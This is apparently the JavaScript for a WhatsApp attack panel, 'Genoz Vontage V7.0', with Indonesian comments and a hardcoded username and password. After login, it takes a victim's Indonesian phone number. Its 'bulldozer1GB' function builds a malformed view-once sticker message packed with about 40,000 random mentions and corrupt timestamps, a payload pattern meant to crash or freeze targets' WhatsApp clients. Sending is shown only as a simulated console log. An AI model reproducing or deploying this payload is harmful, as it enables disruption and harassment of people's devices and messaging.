const VALID_USERNAME = "genozvontagev7";
const VALID_PASSWORD = "vontage7";

// Fungsi untuk menampilkan pesan hasil
function showResultMessage() {
    const resultMessage = document.getElementById('resultMessage');
    resultMessage.style.display = 'block';
    
    // Sembunyikan pesan setelah 3 detik
    setTimeout(() => {
        resultMessage.style.display = 'none';
    }, 3000);
}

// Fungsi untuk validasi nomor target
function validateTargetNumber(number) {
    if (!number) {
        alert('Harap masukkan nomor target terlebih dahulu!');
        return false;
    }
    
    if (!number.startsWith('628')) {
        alert('Nomor target harus dimulai dengan 628!');
        return false;
    }
    
    if (number.length < 10) {
        alert('Nomor target terlalu pendek!');
        return false;
    }
    
    return true;
}

// Fungsi utama bulldozer1GB
async function bulldozer1GB(target) {
    let parse = true;
    let SID = "5e03e0&mms3";
    let key = "10000000_2012297619515179_5714769099548640934_n.enc";
    let type = "image/webp";
    if (11 > 9) {
        parse = parse ? false : true;
    }

    // Konversi nomor target ke format JID
    let jid = target.includes('@') ? target : `${target}@s.whatsapp.net`;

    let message = {
        viewOnceMessage: {
            message: {
                stickerMessage: {
                    url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
                    fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                    fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                    mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
                    mimetype: type,
                    directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
                    fileLength: {
                        low: Math.floor(Math.random() * 1000),
                        high: 0,
                        unsigned: true,
                    },
                    mediaKeyTimestamp: {
                        low: Math.floor(Math.random() * 1700000000),
                        high: 0,
                        unsigned: false,
                    },
                    firstFrameLength: 19904,
                    firstFrameSidecar: "KN4kQ5pyABRAgA==",
                    isAnimated: true,
                    contextInfo: {
                        participant: jid,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1000 * 40 },
                                () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                            ),
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                    },
                    stickerSentTs: {
                        low: Math.floor(Math.random() * -20000000),
                        high: 555,
                        unsigned: parse,
                    },
                    isAvatar: parse,
                    isAiSticker: parse,
                    isLottie: parse,
                },
            },
        },
    };

    // Simulasikan pengiriman pesan
    console.log(`Mengirim payload ke ${jid}`);
    console.log("Payload:", message);
    
    // Simulasi delay pengiriman
    await new Promise(resolve => setTimeout(resolve, 2000));
    
    return true;
}

// Fungsi untuk handle login
function handleLogin() {
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const errorElement = document.getElementById('loginError');
    
    if (username === VALID_USERNAME && password === VALID_PASSWORD) {
        // Login sukses, tampilkan main container
        document.getElementById('loginContainer').style.display = 'none';
        document.getElementById('mainContainer').style.display = 'block';
        errorElement.style.display = 'none';
    } else {
        // Login gagal, tampilkan error
        errorElement.style.display = 'block';
    }
}

// Fungsi-fungsi untuk masing-masing mode yang memanggil bulldozer1GB
async function androsMode() {
    const targetNumber = document.getElementById('targetNumber').value;
    
    if (!validateTargetNumber(targetNumber)) return;
    
    console.log(`ANDROS MODE diaktifkan untuk target: ${targetNumber}`);
    showResultMessage();
    
    try {
        const result = await bulldozer1GB(targetNumber);
        if (result) {
            console.log("ANDROS MODE berhasil dijalankan");
        }
    } catch (error) {
        console.error("Error in ANDROS MODE:", error);
    }
}

async function iosMode() {
    const targetNumber = document.getElementById('targetNumber').value;
    
    if (!validateTargetNumber(targetNumber)) return;
    
    console.log(`IOS MODE diaktifkan untuk target: ${targetNumber}`);
    showResultMessage();
    
    try {
        const result = await bulldozer1GB(targetNumber);
        if (result) {
            console.log("IOS MODE berhasil dijalankan");
        }
    } catch (error) {
        console.error("Error in IOS MODE:", error);
    }
}

async function androsDelayHardMode() {
    const targetNumber = document.getElementById('targetNumber').value;
    
    if (!validateTargetNumber(targetNumber)) return;
    
    console.log(`ANDROS DELAY HARD MODE diaktifkan untuk target: ${targetNumber}`);
    showResultMessage();
    
    try {
        // Tambahkan delay tambahan untuk hard mode
        await new Promise(resolve => setTimeout(resolve, 3000));
        const result = await bulldozer1GB(targetNumber);
        if (result) {
            console.log("ANDROS DELAY HARD MODE berhasil dijalankan");
        }
    } catch (error) {
        console.error("Error in ANDROS DELAY HARD MODE:", error);
    }
}

// Inisialisasi event listener setelah DOM siap
document.addEventListener('DOMContentLoaded', function() {
    // Setup login
    document.getElementById('loginBtn').addEventListener('click', handleLogin);
    
    // Tambahkan event listener untuk tombol enter di field password
    document.getElementById('password').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            handleLogin();
        }
    });
    
    // Dapatkan referensi ke semua tombol mode (akan tersedia setelah login)
    const androsBtn = document.getElementById('androsBtn');
    const iosBtn = document.getElementById('iosBtn');
    const androsDelayBtn = document.getElementById('androsDelayBtn');
    
    // Tambahkan event listener untuk masing-masing tombol mode
    androsBtn.addEventListener('click', androsMode);
    iosBtn.addEventListener('click', iosMode);
    androsDelayBtn.addEventListener('click', androsDelayHardMode);
    
    console.log("Aplikasi Genoz Vontage V7.0 siap digunakan!");
});
